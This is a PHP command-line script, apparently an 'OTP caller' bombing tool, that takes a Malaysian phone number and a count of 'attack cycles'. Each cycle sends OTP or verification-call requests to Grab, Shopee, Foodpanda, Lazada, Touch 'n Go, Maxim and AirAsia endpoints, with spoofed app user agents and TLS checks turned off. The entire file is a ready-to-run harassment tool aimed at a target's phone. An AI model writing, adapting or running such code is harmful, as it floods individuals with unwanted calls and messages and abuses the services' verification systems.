<?php

class MalaysiaCaller {
    private $number;
    
    private function formatNumber($number) {
        // Clean number
        $number = preg_replace('/[^0-9]/', '', $number);
        
        // Format to 60XXXXXXXXX
        if (substr($number, 0, 2) == "60") {
            return $number;
        } elseif (substr($number, 0, 1) == "0") {
            return "60" . substr($number, 1);
        } else {
            return "60" . $number;
        }
    }
    
    private function grabCall($no) {
        $rand = rand(100000, 999999);
        $post = "method=CALL&countryCode=my&phoneNumber=" . urlencode($no) . "&templateID=pax_android_production";
        
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://api.grab.com/grabid/v1/phone/otp");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_TIMEOUT, 20);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            "User-Agent: Grab/5.20.0 (Android 6.0.1; Build $rand)",
            "Content-Type: application/x-www-form-urlencoded",
            "X-Request-ID: " . uniqid(),
        ));
        
        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        
        return $httpCode == 200 || $httpCode == 204;
    }
    
    private function shopeeCall($no) {
        $url = "https://shopee.com.my/api/v1/otp/request";
        $post = "phone=" . urlencode($no) . "&country_code=60";
        
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_TIMEOUT, 20);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            "User-Agent: Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36",
            "Content-Type: application/x-www-form-urlencoded",
            "Referer: https://shopee.com.my",
        ));
        
        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        
        return $httpCode == 200;
    }
    
    private function foodpandaCall($no) {
        $url = "https://api.foodpanda.my/v1/otp/send";
        $post = json_encode(array(
            "phone_number" => $no,
            "country_code" => "MY"
        ));
        
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_TIMEOUT, 20);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            "User-Agent: FoodPanda/4.6.0 (Android 11)",
            "Content-Type: application/json",
            "Accept: application/json",
        ));
        
        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        
        return $httpCode == 200;
    }
    
    private function lazadaCall($no) {
        $url = "https://my.lazada.com/api/rest/sms/sendOtp";
        $post = "mobile=" . urlencode($no) . "&countryCode=60&type=1";
        
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_TIMEOUT, 20);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            "User-Agent: Lazada/6.0.0 (Android 11)",
            "Content-Type: application/x-www-form-urlencoded",
        ));
        
        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        
        return $httpCode == 200;
    }
    
    private function tngCall($no) {
        // Touch 'n Go eWallet
        $url = "https://api.tngdigital.com.my/otp/request";
        $post = json_encode(array(
            "phoneNumber" => $no,
            "channel" => "call"
        ));
        
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_TIMEOUT, 20);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            "User-Agent: TNG/eWallet/2.5.0 (Android 11)",
            "Content-Type: application/json",
            "Accept: application/json",
        ));
        
        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        
        return $httpCode == 200;
    }
    
    private function maximCall($no) {
        // Maxim Malaysia (similar to Grab)
        $url = "https://api.my.maxim.com/v1/verify/send";
        $post = json_encode(array(
            "phone" => $no,
            "country_code" => "60"
        ));
        
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_TIMEOUT, 20);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            "User-Agent: Maxim/2.8.0 (Android 11)",
            "Content-Type: application/json",
        ));
        
        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        
        return $httpCode == 200;
    }
    
    private function airasiaCall($no) {
        $url = "https://api.airasia.com/v1/otp/send";
        $post = json_encode(array(
            "phoneNumber" => $no,
            "countryCode" => "60"
        ));
        
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_TIMEOUT, 20);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            "User-Agent: airasia/2.0.0 (Android 11)",
            "Content-Type: application/json",
        ));
        
        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        
        return $httpCode == 200;
    }
    
    public function run() {
        system('clear');
        
        echo "\n╔══════════════════════════════════════╗\n";
        echo "║     MALAYSIA OTP CALLER - v2.0       ║\n";
        echo "║        Multi Service Attack          ║\n";
        echo "╚══════════════════════════════════════╝\n\n";
        
        echo "[!] Supported numbers: 012, 013, 014, 016, 017, 018, 019\n";
        echo "[!] 011 numbers have limited support\n\n";
        
        // Get phone number
        while (true) {
            echo "Enter Malaysian number: ";
            $input = trim(fgets(STDIN));
            $clean = preg_replace('/[^0-9]/', '', $input);
            
            if (strlen($clean) >= 9 && strlen($clean) <= 12) {
                $this->number = $this->formatNumber($clean);
                break;
            } else {
                echo "❌ Invalid number!\n\n";
            }
        }
        
        // Get number of cycles
        while (true) {
            echo "How many attack cycles? (1-10): ";
            $cycles = trim(fgets(STDIN));
            
            if (is_numeric($cycles) && $cycles > 0 && $cycles <= 10) {
                break;
            } else {
                echo "❌ Enter 1-10\n";
            }
        }
        
        echo "\n[+] Target: {$this->number}\n";
        echo "[+] Attack cycles: $cycles\n";
        echo "[+] Starting multi-service attack...\n\n";
        
        $services = [
            'Grab' => 'grabCall',
            'Shopee' => 'shopeeCall',
            'Foodpanda' => 'foodpandaCall',
            'Lazada' => 'lazadaCall',
            'Touch n Go' => 'tngCall',
            'Maxim' => 'maximCall',
            'AirAsia' => 'airasiaCall'
        ];
        
        $totalSuccess = 0;
        $totalFailed = 0;
        
        for ($cycle = 1; $cycle <= $cycles; $cycle++) {
            echo "══════════════════════════════════════\n";
            echo "CYCLE $cycle of $cycles\n";
            echo "══════════════════════════════════════\n";
            
            $cycleSuccess = 0;
            $cycleFailed = 0;
            
            foreach ($services as $name => $method) {
                echo "[*] Calling via $name... ";
                
                if ($this->$method($this->number)) {
                    echo "✅ SUCCESS\n";
                    $cycleSuccess++;
                    $totalSuccess++;
                } else {
                    echo "❌ FAILED\n";
                    $cycleFailed++;
                    $totalFailed++;
                }
                
                sleep(rand(3, 6));
            }
            
            echo "\n[+] Cycle $cycle results: ✅ $cycleSuccess | ❌ $cycleFailed\n\n";
            
            if ($cycle < $cycles) {
                echo "[*] Waiting 60 seconds before next cycle...\n";
                sleep(60);
            }
        }
        
        echo "\n══════════════════════════════════════\n";
        echo "FINAL RESULTS\n";
        echo "══════════════════════════════════════\n";
        echo "Total Cycles: $cycles\n";
        echo "Total Successful: $totalSuccess\n";
        echo "Total Failed: $totalFailed\n";
        echo "Success Rate: " . round(($totalSuccess / ($totalSuccess + $totalFailed)) * 100, 2) . "%\n";
        echo "══════════════════════════════════════\n\n";
    }
}

// Check PHP extensions
if (!function_exists('curl_init')) {
    die("❌ Install PHP CURL: pkg install php-curl\n");
}

if (!function_exists('json_encode')) {
    die("❌ Install PHP JSON: pkg install php-json\n");
}

// Run
try {
    $caller = new MalaysiaCaller();
    $caller->run();
} catch (Exception $e) {
    echo "❌ Error: " . $e->getMessage() . "\n";
}

?>
